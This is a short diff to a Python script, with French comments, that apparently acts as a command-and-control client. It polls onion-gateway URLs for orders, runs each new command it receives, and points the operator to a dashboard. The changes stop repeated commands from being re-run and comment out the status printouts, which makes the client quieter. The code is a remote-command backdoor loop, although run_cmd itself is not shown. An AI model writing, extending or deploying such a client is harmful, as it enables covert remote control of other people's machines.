@@ -5,6 +5,7 @@ import requests
 import re
 import socket
 import time
+from colorama import *
 
 # cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html'
 # cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'
@@ -69,13 +70,13 @@ while True:
     time.sleep(5)
     try:
         check_cmd = get_cmd()
-        # if check_cmd != check_cmd_1 and type(check_cmd) != None :
-        if check_cmd and type(check_cmd) != None :
-            print("[+] Commande à envoyer : " + str(check_cmd))
+        # print("%s <=> %s" % (check_cmd, check_cmd_1))
+        if check_cmd != check_cmd_1 and type(check_cmd) != None :
+            # print("[+] Commande à envoyer : " + str(check_cmd))
             time.sleep(2)
             run_cmd(check_cmd)
             check_cmd_1 = check_cmd
-            print("[!] Commande executée, consultez le dashboard")
+            # print("[!] Commande executée, consultez le dashboard")
             pass
     except Exception as e:
         print(e)
